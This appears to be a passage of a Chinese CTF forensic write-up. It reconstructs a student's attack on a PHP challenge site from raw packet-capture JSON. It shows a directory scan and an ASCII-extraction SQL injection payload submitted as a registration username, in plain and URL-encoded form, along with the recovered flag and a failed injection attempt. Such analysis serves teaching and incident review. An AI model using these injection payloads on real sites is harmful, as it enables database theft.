"ip.addr": "10.255.217.224", "ip.src_host": "99.999.9.12", "ip.host": "10.255.217.224", "ip.dst": "10.255.217.224", "ip.dst_host": "10.255.217.224"}, "tcp": {"tcp.srcport": "8888", "tcp.dstport": "44833", "tcp.port": "44833", "tcp.stream": "228588", "tcp.completeness": "15", "tcp.len": "331", "tcp.seq": "1292", "tcp.seq_raw": "1586153191", "tcp.nxtseq": "1623", "tcp.ack": "4536", "tcp.ack_raw": "1525014655", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "503", "tcp.window_size": "64384", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0xdc58", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:57:51:3f:ee:e1:f3:04:97", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:57:51:3f:ee:e1:f3:04:97", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "1464942574", "tcp.options.timestamp.tsecr": "3790800023"}}, "Timestamps": {"tcp.time_relative": "0.714241000", "tcp.time_delta": "0.042688000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.065259000", "tcp.analysis.bytes_in_flight": "331", "tcp.analysis.push_bytes_sent": "331"}, "tcp.payload": "47:45:54:20:2f:45:72:53:79:42:73:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:75:73:65:72:2d:61:67:65:6e:74:3a:20:4d:6f:7a:69:6c:6c:61:2f:35:2e:30:20:28:57:69:6e:64:6f:77:73:20:4e:54:20:31:30:2e:30:3b:20:57:69:6e:36:34:3b:20:78:36:34:29:20:41:70:70:6c:65:57:65:62:4b:69:74:2f:35:33:37:2e:33:36:20:28:4b:48:54:4d:4c:2c:20:6c:69:6b:65:20:47:65:63:6b:6f:29:20:43:68:72:6f:6d:65:2f:38:37:2e:30:2e:34:32:38:30:2e:38:38:20:53:61:66:61:72:69:2f:35:33:37:2e:33:36:0d:0a:61:63:63:65:70:74:2d:65:6e:63:6f:64:69:6e:67:3a:20:2a:0d:0a:61:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:6b:65:65:70:2d:61:6c:69:76:65:3a:20:74:69:6d:65:6f:75:74:3d:31:35:2c:20:6d:61:78:3d:31:30:30:30:0d:0a:63:61:63:68:65:2d:63:6f:6e:74:72:6f:6c:3a:20:6d:61:78:2d:61:67:65:3d:30:0d:0a:43:6f:6f:6b:69:65:3a:20:50:48:50:53:45:53:53:49:44:3d:31:6b:6f:32:71:75:39:30:37:6f:32:63:64:74:6e:6f:65:62:31:74:66:68:35:6c:6e:32:0d:0a:0d:0a"}, "http": {"GET /ErSyBs HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "GET /ErSyBs HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "GET", "http.request.uri": "/ErSyBs", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Cookie: PHPSESSID=1ko2qu907o2cdtnoeb1tfh5ln2\r\n", "http.user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36", "http.accept_encoding": "*", "http.accept": "*/*", "http.connection": "keep-alive", "http.cache_control": "max-age=0", "http.cookie": "PHPSESSID=1ko2qu907o2cdtnoeb1tfh5ln2", "http.cookie_tree": {"http.cookie_pair": "PHPSESSID=1ko2qu907o2cdtnoeb1tfh5ln2"}, "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/ErSyBs", "http.request": "1", "http.request_number": "5", "http.prev_request_in": "6879343"}}}}
```

### 攻击步骤 4-2

（成功动作）紧接着，从`Apr 19, 2023 05:13:48 CST`到`Apr 19, 2023 05:16:24.187796000 CST`攻击者开始进行SQL注入。攻击者使用形如`0'+ascii(substr((select * from flag) from 1 for 1))+'0`的字符串作为username来注册目标网站的账号，利用ASCII编码提取flag的每一位，然后访问index.php读取回显。

根据服务器返回的html数据，我们编写脚本自动解码出了该同学在`Apr 19, 2023 05:16:24.187796000 CST`时的第四题flag：`e0e45d68-247c-428d-b8bd-f71326173e07`。


```
{"_index": "packets-2023-04-19", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 19, 2023 05:13:48.473348000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681852428.473348000", "frame.time_delta": "0.000139000", "frame.time_delta_displayed": "0.000139000", "frame.time_relative": "328090.347463000", "frame.number": "6927971", "frame.len": "404", "frame.cap_len": "404", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "62:d1:ea:ce:1d:30", "eth.dst_tree": {"eth.dst_resolved": "62:d1:ea:ce:1d:30", "eth.dst.oui": "6476266", "eth.addr": "62:d1:ea:ce:1d:30", "eth.addr_resolved": "62:d1:ea:ce:1d:30", "eth.addr.oui": "6476266", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "390", "ip.id": "0x585f", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0xf312", "ip.checksum.status": "2", "ip.src": "99.999.9.12", "ip.addr": "10.255.217.224", "ip.src_host": "99.999.9.12", "ip.host": "10.255.217.224", "ip.dst": "10.255.217.224", "ip.dst_host": "10.255.217.224"}, "tcp": {"tcp.srcport": "8888", "tcp.dstport": "37785", "tcp.port": "37785", "tcp.stream": "229545", "tcp.completeness": "15", "tcp.len": "338", "tcp.seq": "20", "tcp.seq_raw": "573780867", "tcp.nxtseq": "358", "tcp.ack": "19", "tcp.ack_raw": "573352523", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "509", "tcp.window_size": "65152", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0xb6aa", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:57:56:49:a6:e1:f8:0d:d5", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:57:56:49:a6:e1:f8:0d:d5", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "1465272742", "tcp.options.timestamp.tsecr": "3791130069"}}, "Timestamps": {"tcp.time_relative": "0.359807000", "tcp.time_delta": "0.074201000"}, "tcp.analysis": {"tcp.analysis.acks_frame": "6927964", "tcp.analysis.ack_rtt": "0.074201000", "tcp.analysis.initial_rtt": "0.073568000", "tcp.analysis.bytes_in_flight": "338", "tcp.analysis.push_bytes_sent": "338"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:38:2e:31:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:31:32:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:65:6d:61:69:6c:3d:31:25:34:30:31:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:31:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.28.1", "http.accept_encoding": "gzip, deflate, br", "http.accept": "*/*", "http.connection": "keep-alive", "http.content_length_header": "112", "http.content_length_header_tree": {"http.content_length": "112"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "1", "http.file_data": "email=1%401.com&username=0%27%2Bascii%28substr%28%28select+%2A+from+flag%29+from+1+for+1%29%29%2B%270&password=1"}, "urlencoded-form": {"Form item: \"email\" = \"1@1.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "1@1.com"}, "Form item: \"username\" = \"0'+ascii(substr((select * from flag) from 1 for 1))+'0\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+ascii(substr((select * from flag) from 1 for 1))+'0"}, "Form item: \"password\" = \"1\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "1"}}}}}
```

```
{"_index": "packets-2023-04-19", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 19, 2023 05:13:49.051560000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681852429.051560000", "frame.time_delta": "0.004151000", "frame.time_delta_displayed": "0.004151000", "frame.time_relative": "328090.925675000", "frame.number": "6927999", "frame.len": "1269", "frame.cap_len": "1269", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:data-text-lines"}, "eth": {"eth.dst": "e2:33:ee:ef:45:42", "eth.dst_tree": {"eth.dst_resolved": "e2:33:ee:ef:45:42", "eth.dst.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "62:d1:ea:ce:1d:30", "eth.src_tree": {"eth.src_resolved": "62:d1:ea:ce:1d:30", "eth.src.oui": "6476266", "eth.addr": "62:d1:ea:ce:1d:30", "eth.addr_resolved": "62:d1:ea:ce:1d:30", "eth.addr.oui": "6476266", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "1255", "ip.id": "0x9221", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "64", "ip.proto": "6", "ip.checksum": "0xb3ef", "ip.checksum.status": "2", "ip.src": "10.255.217.224", "ip.addr": "99.999.9.12", "ip.src_host": "10.255.217.224", "ip.host": "99.999.9.12", "ip.dst": "99.999.9.12", "ip.dst_host": "99.999.9.12"}, "tcp": {"tcp.srcport": "41481", "tcp.dstport": "8888", "tcp.port": "8888", "tcp.stream": "229546", "tcp.completeness": "15", "tcp.len": "1203", "tcp.seq": "987", "tcp.seq_raw": "2442248138", "tcp.nxtseq": "2190", "tcp.ack": "466", "tcp.ack_raw": "1569364157", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "501", "tcp.window_size": "64128", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0xf4d9", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:e1:f8:10:62:57:56:4b:e6", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:e1:f8:10:62:57:56:4b:e6", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "3791130722", "tcp.options.timestamp.tsecr": "1465273318"}}, "Timestamps": {"tcp.time_relative": "0.420279000", "tcp.time_delta": "0.004151000"}, "tcp.analysis": {"tcp.analysis.acks_frame": "6927998", "tcp.analysis.ack_rtt": "0.004151000", "tcp.analysis.initial_rtt": "0.066769000", "tcp.analysis.bytes_in_flight": "1203", "tcp.analysis.push_bytes_sent": "1203"}, "tcp.payload": "48:54:54:50:2f:31:2e:31:20:32:30:30:20:4f:4b:0d:0a:44:61:74:65:3a:20:54:75:65:2c:20:31:38:20:41:70:72:20:32:30:32:33:20:32:31:3a:31:33:3a:34:39:20:47:4d:54:0d:0a:53:65:72:76:65:72:3a:20:41:70:61:63:68:65:2f:32:2e:34:2e:37:20:28:55:62:75:6e:74:75:29:0d:0a:58:2d:50:6f:77:65:72:65:64:2d:42:79:3a:20:50:48:50:2f:35:2e:35:2e:39:2d:31:75:62:75:6e:74:75:34:2e:32:39:0d:0a:45:78:70:69:72:65:73:3a:20:54:68:75:2c:20:31:39:20:4e:6f:76:20:31:39:38:31:20:30:38:3a:35:32:3a:30:30:20:47:4d:54:0d:0a:43:61:63:68:65:2d:43:6f:6e:74:72:6f:6c:3a:20:6e:6f:2d:73:74:6f:72:65:2c:20:6e:6f:2d:63:61:63:68:65:2c:20:6d:75:73:74:2d:72:65:76:61:6c:69:64:61:74:65:2c:20:70:6f:73:74:2d:63:68:65:63:6b:3d:30:2c:20:70:72:65:2d:63:68:65:63:6b:3d:30:0d:0a:50:72:61:67:6d:61:3a:20:6e:6f:2d:63:61:63:68:65:0d:0a:56:61:72:79:3a:20:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:0d:0a:43:6f:6e:74:65:6e:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:37:39:34:0d:0a:4b:65:65:70:2d:41:6c:69:76:65:3a:20:74:69:6d:65:6f:75:74:3d:35:2c:20:6d:61:78:3d:39:39:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:4b:65:65:70:2d:41:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:74:65:78:74:2f:68:74:6d:6c:0d:0a:0d:0a:1f:8b:08:00:00:00:00:00:00:03:95:55:cd:72:d3:30:10:be:f7:29:84:18:c6:e9:4c:1c:27:a5:b4:4c:6a:e7:00:d3:0e:cc:c0:70:68:5f:40:91:36:b6:5a:59:76:25:d9:69:60:b8:71:e0:ca:4c:4f:3c:01:cf:c0:fb:40:5f:03:c9:b2:13:a7:0d:0c:bd:24:bb:df:ee:b7:7f:5a:c9:f1:13:56:50:b3:2a:01:65:26:17:b3:bd:d8:fd:21:41:64:9a:60:90:78:b6:87:50:9c:01:61:4e:b0:62:0e:86:20:9a:11:a5:c1:24:b8:32:8b:f0:25:6e:4d:86:1b:01:b3:df:5f:bf:dd:7d:ff:f2:eb:e7:ed:dd:ed:8f:38:f2:58:8f:9a:19:53:86:70:5d:f1:3a:c1:54:00:51:2e:35:46:b4:90:06:a4:8d:58:48:dc:77:97:24:87:04:bf:2f:e6:5c:c0:87:d2:f0:9c:7f:04:d6:73:7f:7e:30:de:e1:ff:86:48:96:81:60:67:8a:83:64:62:d5:23:5c:a8:0a:76:30:48:59:0a:08:f3:26:4f:b8:84:79:68:81:90:92:92:cc:45:bf:ba:15:e8:1d:e4:9a:c3:b2:2c:94:e9:39:2e:39:33:59:c2:a0:e6:d4:c6:73:ca:30:03:9e:66:a6:c3:bc:36:e4:92:1b:4e:44:a8:29:11:90:4c:46:e3:61:6e:a1:bc:ca:fb:08:b9:b9:87:54:1a:54:a3:ba:f2:12:59:60:14:b5:55:09:2e:af:90:02:91:60:6d:56:02:74:06:60:cb:ca:14:2c:12:3c:8a:36:98:8e:b8:64:70:33:a2:7a:dd:d0:ff:53:17:82:18:6e:5b:6d:d8:0f:53:07:1b:df:c0:f3:83:6d:7e:23:3b:72:e0:c9:71:d4:2d:58:3c:2f:d8:6a:b6:e7:03:4a:52:23:ce:12:9c:83:ac:da:22:2d:ca:78:dd:c9:5e:43:54:10:ad:13:cc:f3:34:b4:2a:de:58:b7:ed:cd:d0:ac:13:9e:c5:f6:17:69:45:5d:5f:55:29:0a:c2:74:44:46:97:25:38:5b:b4:95:c0:86:d0:25:91:5b:31:dc:a1:6f:65:41:68:32:9e:f4:18:91:a3:f4:8a:ec:87:ec:29:71:64:3b:ec:9a:cd:09:97:4d:b7:96:0a:62:d3:ae:9b:0c:a8:5e:30:0f:74:05:95:f6:37:f4:10:fe:6b:d5:3d:a7:b0:b9:90:78:f6:fa:e2:ec:7e:99:ed:b4:5c:0d:73:42:af:c2:ad:b1:3f:1c:67:2a:56:65:16:ba:35:40:dd:3e:84:8e:77:9f:f2:60:9e:0f:80:2e:ab:1b:2e:97:8b:22:5c:2a:52:ea:47:a6:b6:cf:91:e1:32:d5:e1:e4:51:05:f8:d5:db:0c:d8:af:86:db:4f:bb:77:e4:c6:5f:dd:e9:64:3c:7e:76:e2:54:7f:6b:a7:1e:28:6a:50:0b:51:2c:a7:19:67:0c:e4:09:f6:3b:c5:73:92:82:8e:8e:8e:0f:0f:c7:c7:76:ab:52:8c:88:b0:4f:02:de:9d:33:8e:dc:d1:b7:b2:a6:8a:97:a6:db:cd:4b:52:13:8f:d8:3b:23:38:83:a2:32:6b:61:64:1f:8a:d1:a5:76:1b:eb:7d:b6:42:74:b9:6a:a2:50:c7:40:09:92:b0:44:e7:ad:3a:f8:b4:1e:4a:d0:2c:5d:30:45:f6:53:50:d9:73:37:a3:14:cc:a9:00:27:be:5a:bd:65:83:d6:61:7f:b8:a1:b8:f5:f8:17:a3:b1:f7:09:25:61:cc:9e:90:e5:1c:bc:38:ea:e1:a6:10:a0:88:a4:60:2d:c7:e3:16:ff:bc:7f:b2:d7:8a:eb:0c:d7:15:a8:d5:39:08:a0:a6:50:83:e0:e9:7a:4b:83:fd:91:8d:7d:5a:5b:a7:77:5c:db:07:18:ac:99:0a:4e:af:82:21:5a:54:92:1a:5e:c8:c1:3e:da:34:bc:1e:a2:29:d2:54:c0:c0:66:db:e4:f5:a7:d2:cd:b1:79:9f:fc:b3:64:0f:ce:7d:22:ff:00:fc:e2:67:d5:32:07:00:00"}, "http": {"HTTP/1.1 200 OK\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "HTTP/1.1 200 OK\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.response.version": "HTTP/1.1", "http.response.code": "200", "http.response.code.desc": "OK", "http.response.phrase": "OK"}, "http.date": "Tue, 18 Apr 2023 21:13:49 GMT", "http.response.line": "Content-Type: text/html\r\n", "http.server": "Apache/2.4.7 (Ubuntu)", "http.cache_control": "no-store, no-cache, must-revalidate, post-check=0, pre-check=0", "http.content_encoding": "gzip", "http.content_length_header": "794", "http.content_length_header_tree": {"http.content_length": "794"}, "http.connection": "Keep-Alive", "http.content_type": "text/html", "\\r\\n": "", "http.response": "1", "http.response_number": "2", "http.time": "0.004151000", "http.prev_request_in": "6927995", "http.prev_response_in": "6927997", "http.request_in": "6927998", "http.response_for.uri": "http://10.0.0.4/index.php", "Content-encoded entity body (gzip): 794 bytes -> 1842 bytes": "", "http.file_data": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <title>������������</title>\n    <meta http-equiv=\"cleartype\" content=\"on\">\n    <meta name=\"MobileOptimized\" content=\"320\">\n    <meta name=\"HandheldFriendly\" content=\"True\">\n    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\n    <meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\n    <link rel=\"stylesheet\" href=\"./stylesheets/index.css\">\n    <link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\n    <link rel='stylesheet' href='./stylesheets/style.css' />\n  </head>\n  <body>\n\n    <nav id=\"menu\">\n      <div>\n        <div class=\"img-div\">\n          <div class=\"user-img\"><img src=\"./uploads/a.jpeg\"></div>\n          <span class=\"user-name\">\n            101          </span>\n        </div>\n      </div>\n    </nav>\n\n    <main id=\"panel\">\n      <header>\n        <header class=\"pass-header\">\n          <span class=\"pass-header-title\">CTF</span>\n          <div id=\"back-menu\">\n            <div class=\"glyph-icon flaticon-back\">\n            </div>\n          </div>\n          <div id=\"userinfo-wraps\">\n            <div class=\"glyph-icon flaticon-settings-1\">\n            </div>\n          </div>\n      </header>\n      <img style=\"max-width:100%;max-height::100%;overflow:hidden;\" src=\"images/674407.jpg\" alt=\"\">\n      </header>\n    </main>\n    <script src=\"./javascripts/slideout/slideout.min.js\"></script>\n    <script>\n      var slideout = new Slideout({\n        'panel': document.getElementById('panel'),\n        'menu': document.getElementById('menu'),\n        'padding': 256,\n        'tolerance': 70\n      });\n\n      document.querySelector('#back-menu').addEventListener('click', function() {\n        slideout.toggle();\n      });\n    </script>\n\n  </body>\n</html>"}, "data-text-lines": {"<!doctype html>\\n": "", "<html lang=\"en\">\\n": "", "  <head>\\n": "", "    <meta charset=\"utf-8\">\\n": "", "    <title>我的应用</title>\\n": "", "    <meta http-equiv=\"cleartype\" content=\"on\">\\n": "", "    <meta name=\"MobileOptimized\" content=\"320\">\\n": "", "    <meta name=\"HandheldFriendly\" content=\"True\">\\n": "", "    <meta name=\"apple-mobile-web-app-capable\" content=\"yes\">\\n": "", "    <meta name=\"viewport\" content=\"width=device-width,height=device-height,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no\" />\\n": "", "    <link rel=\"stylesheet\" href=\"./stylesheets/index.css\">\\n": "", "    <link rel=\"stylesheet\" href=\"./stylesheets/flaticon.css\" />\\n": "", "    <link rel='stylesheet' href='./stylesheets/style.css' />\\n": "", "  </head>\\n": "", "  <body>\\n": "", "\\n": "", "    <nav id=\"menu\">\\n": "", "      <div>\\n": "", "        <div class=\"img-div\">\\n": "", "          <div class=\"user-img\"><img src=\"./uploads/a.jpeg\"></div>\\n": "", "          <span class=\"user-name\">\\n": "", "            101          </span>\\n": "", "        </div>\\n": "", "      </div>\\n": "", "    </nav>\\n": "", "    <main id=\"panel\">\\n": "", "      <header>\\n": "", "        <header class=\"pass-header\">\\n": "", "          <span class=\"pass-header-title\">CTF</span>\\n": "", "          <div id=\"back-menu\">\\n": "", "            <div class=\"glyph-icon flaticon-back\">\\n": "", "            </div>\\n": "", "          </div>\\n": "", "          <div id=\"userinfo-wraps\">\\n": "", "            <div class=\"glyph-icon flaticon-settings-1\">\\n": "", "      </header>\\n": "", "      <img style=\"max-width:100%;max-height::100%;overflow:hidden;\" src=\"images/674407.jpg\" alt=\"\">\\n": "", "    </main>\\n": "", "    <script src=\"./javascripts/slideout/slideout.min.js\"></script>\\n": "", "    <script>\\n": "", "      var slideout = new Slideout({\\n": "", "        'panel': document.getElementById('panel'),\\n": "", "        'menu': document.getElementById('menu'),\\n": "", "        'padding': 256,\\n": "", "        'tolerance': 70\\n": "", "      });\\n": "", "      document.querySelector('#back-menu').addEventListener('click', function() {\\n": "", "        slideout.toggle();\\n": "", "    </script>\\n": "", "  </body>\\n": "", "</html>": ""}}}}
```

### 攻击步骤 4-3

（准备动作）从`Apr 23, 2023 21:10:44.348292000 中国标准时间`持续到了`Apr 23, 2023 21:13:58.911153000 中国标准时间`，攻击者又进行了目录扫描，访问了如`/.admin`、`/.access`、`/.AppleDB`、`/.git`等URL，扫描记录一共4543条。

### 攻击步骤 4-4

（失败动作）可以看出，`Apr 23, 2023 22:22:36.443178000 中国标准时间`的时候，该同学尝试使用了`'+aba+'`进行SQL注入攻击。可惜，MySQL没法使用`+`号拼接字符串，所以该同学没法得到他想要的回显。从服务器返回的`index.php`的html可以看出，回显的结果是`0`，并不是该同学输入的`+aba+`，但这说明SQL注入是可行的。

```
{"_index": "packets-2023-04-23", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 23, 2023 22:22:36.443178000 中国标准时间", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682259756.443178000", "frame.time_delta": "0.080293000", "frame.time_delta_displayed": "0.080293000", "frame.time_relative": "202530.815981000", "frame.number": "4195678", "frame.len": "660", "frame.cap_len": "660", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "6e:46:94:7c:10:9f", "eth.dst_tree": {"eth.dst_resolved": "6e:46:94:7c:10:9f", "eth.dst.oui": "7227028", "eth.addr": "6e:46:94:7c:10:9f", "eth.addr_resolved": "6e:46:94:7c:10:9f", "eth.addr.oui": "7227028", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "646", "ip.id": "0x21b6", "ip.flags": "0x02", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0xa24c", "ip.checksum.status": "2", "ip.src": "99.999.9.12", "ip.addr": "10.255.96.80", "ip.src_host": "99.999.9.12", "ip.host": "10.255.96.80", "ip.dst": "10.255.96.80", "ip.dst_host": "10.255.96.80"}, "tcp": {"tcp.srcport": "8888", "tcp.dstport": "36891", "tcp.port": "36891", "tcp.stream": "89965", "tcp.completeness": "31", "tcp.len": "594", "tcp.seq": "20", "tcp.seq_raw": "1297005798", "tcp.nxtseq": "614", "tcp.ack": "19", "tcp.ack_raw": "2926814861", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ae": "0", "tcp.flags.cwr": "0", "tcp.flags.ece": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "509", "tcp.window_size": "65152", "tcp.window_size_scalefactor": "128", "tcp.checksum": "0xadaa", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:73:78:34:6a:0c:2a:f2:8f", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:73:78:34:6a:0c:2a:f2:8f", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": 